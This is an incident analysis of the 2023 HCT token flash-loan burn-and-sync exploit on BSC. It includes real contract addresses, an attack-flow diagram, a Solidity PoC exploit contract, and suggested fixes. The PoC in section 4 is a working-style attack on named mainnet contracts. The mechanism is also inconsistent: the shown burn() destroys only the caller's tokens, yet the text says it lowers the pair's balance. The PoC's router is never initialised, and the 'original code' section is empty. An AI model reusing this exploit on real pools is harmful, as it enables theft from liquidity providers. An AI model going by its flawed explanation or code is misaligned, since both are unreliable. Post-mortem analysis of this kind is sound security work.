# HCT Flash Loan Burn Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | HCT Token |
| Date | 2023-09-08 |
| Chain | BSC (Binance Smart Chain) |
| Loss | 30.5 BNB |
| Attack Type | Flash Loan + Token Burn + Sync Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xc892d5576c65e5b0db194c1a28aa758a43bb42a5` |
| Attack Contract | `0xd7a2fc756e1053b152f90990129f94c573e006fd` |
| Vulnerable Contract | `0x0FDfcfc398Ccc90124a0a41d920d6e2d0bD8CcF5` (HCT Token) |
| PancakePair | `0xdbE783014Cb0662c629439FBBBa47e84f1B6F2eD` |
| Fork Block | 31,528,197 |

## 2. Vulnerability Code Analysis

HCT Token was a deflationary token that burned a portion of each transfer. When a burn occurred, the pair's actual HCT balance dropped below its reserves, and a subsequent `sync()` call reset the reserves to the actual balance, distorting the WBNB/HCT exchange rate. The attacker exploited this by borrowing a large amount of WBNB via flash loan, purchasing HCT, burning it, and calling `sync()` to artificially inflate the HCT price before selling.

```solidity
// Vulnerable pattern: reserve mismatch due to deflationary token burn
contract HCTToken is ERC20 {
    uint256 public constant BURN_RATE = 200; // 2%

    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 burnAmount = amount * BURN_RATE / 10000;
        // Burn: reduces total token supply
        _burn(from, burnAmount);
        // Actual transfer amount is reduced
        super._transfer(from, to, amount - burnAmount);
        // Pair balance < pair reserve mismatch occurs
    }

    // Vulnerable: publicly callable burn function
    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }
}
```

**Vulnerability**: The deflationary burn mechanism of HCT Token was exploited through the reserve mismatch that occurs when combined with an AMM pair. Burning a large amount of HCT causes the pair's actual HCT balance to fall below its reserves, and updating the reserves via `sync()` causes a sharp spike in HCT price. The attacker held HCT in advance of this price spike to capture the arbitrage profit.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Token Burn + Sync Manipulation
// Source code unverified — analysis based on bytecode
```

## 3. Attack Flow

```
Attacker [0xc892d5576c65e5b0db194c1a28aa758a43bb42a5]
  │
  ├─1─▶ DPPOracle.flashLoan(WBNB)
  │      [DPPOracle: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]
  │      Borrow large amount of WBNB
  │      [WBNB: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
  │
  ├─2─▶ swapWBNBtoHCT()
  │      Swap WBNB → HCT
  │      [HCT: 0x0FDfcfc398Ccc90124a0a41d920d6e2d0bD8CcF5]
  │
  ├─3─▶ HCT.burn(amount)
  │      Burn large amount of HCT → pair balance < reserves
  │      [PancakePair: 0xdbE783014Cb0662c629439FBBBa47e84f1B6F2eD]
  │
  ├─4─▶ PancakePair.sync()
  │      Update reserves to current balance (reduced HCT)
  │      → HCT/WBNB price spikes sharply
  │
  ├─5─▶ swapHCTtoWBNB()
  │      Swap remaining HCT back to WBNB at inflated price
  │      → Receive more WBNB than initially spent
  │
  └─6─▶ WBNB.transfer(DPPOracle)
         Repay flash loan + realize 30.5 BNB profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ICoinToken is IERC20 {
    function burn(uint256 amount) external;
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakePair {
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin, address[] calldata path,
        address to, uint256 deadline
    ) external;
}

contract HCTExploit {
    ICoinToken HCT = ICoinToken(0x0FDfcfc398Ccc90124a0a41d920d6e2d0bD8CcF5);
    IWBNB WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair pair = IPancakePair(0xdbE783014Cb0662c629439FBBBa47e84f1B6F2eD);
    IDPPOracle dppOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IPancakeRouter router;

    function testExploit() external {
        // Borrow WBNB via DODO flash loan
        dppOracle.flashLoan(
            WBNB.balanceOf(address(dppOracle)) * 99 / 100,
            0,
            address(this),
            "hct"
        );
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        // Swap WBNB → HCT
        swapWBNBtoHCT();

        uint256 hctBalance = HCT.balanceOf(address(this));

        // Burn HCT → reduce pair balance
        HCT.burn(hctBalance * 80 / 100);

        // Update reserves via sync() → HCT price spikes
        pair.sync();

        // Swap remaining HCT back to WBNB at inflated price
        swapHCTtoWBNB();

        // Repay flash loan
        WBNB.transfer(address(dppOracle), baseAmount);
    }

    function swapWBNBtoHCT() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(HCT);
        WBNB.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function swapHCTtoWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(HCT);
        path[1] = address(WBNB);
        HCT.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            HCT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Deflationary burn + sync reserve manipulation |
| Impact Scope | HCT-WBNB liquidity pool |
| Explorer | [BSCscan](https://bscscan.com/address/0x0FDfcfc398Ccc90124a0a41d920d6e2d0bD8CcF5) |

## 6. Security Recommendations

```solidity
// Fix 1: Remove public burn function or restrict access
contract HCTToken is ERC20 {
    // Burns should only happen internally (as transfer tax)
    // Remove external burn() function

    // Or restrict with access control
    function burn(uint256 amount) external {
        require(hasRole(BURNER_ROLE, msg.sender), "Not authorized to burn");
        _burn(msg.sender, amount);
    }
}

// Fix 2: Set price deviation threshold after sync() call
// When using a custom AMM:
function sync() external {
    uint256 priceBefore = reserve1 * 1e18 / reserve0; // WBNB/HCT price
    _update(HCT.balanceOf(address(this)), WBNB.balanceOf(address(this)), reserve0, reserve1);
    uint256 priceAfter = reserve1 * 1e18 / reserve0;
    // Freeze if price change exceeds 10%
    require(
        priceAfter <= priceBefore * 110 / 100 &&
        priceAfter >= priceBefore * 90 / 100,
        "Price deviation too high"
    );
}

// Fix 3: Limit burn amount per transaction
uint256 public constant MAX_BURN_PER_TX = 1_000_000e18;

function burn(uint256 amount) external {
    require(amount <= MAX_BURN_PER_TX, "Burn amount too large");
    _burn(msg.sender, amount);
}
```

## 7. Lessons Learned

1. **Deflationary Token + AMM Vulnerability**: Tokens with burn mechanisms are vulnerable to price manipulation through reserve mismatches when combined with AMM pairs. Updating reserves via `sync()` after a large-scale burn becomes an attack vector.
2. **Danger of Public burn() Functions**: A `burn()` function callable by anyone becomes a price manipulation tool. Burns should only occur through internal logic (transfer tax) or be restricted to authorized accounts.
3. **BSC Deflationary Token Pattern**: Small-cap tokens with burn mechanisms on BSC are repeatedly victimized by this attack pattern. WGPT, HCT, and others have all fallen to the same pattern.
4. **DODO DPP Oracle Flash Loans**: On BSC, DODO DPP Oracle provides large-scale liquidity in a single transaction. Deflationary token projects must analyze the manipulation risk this liquidity enables.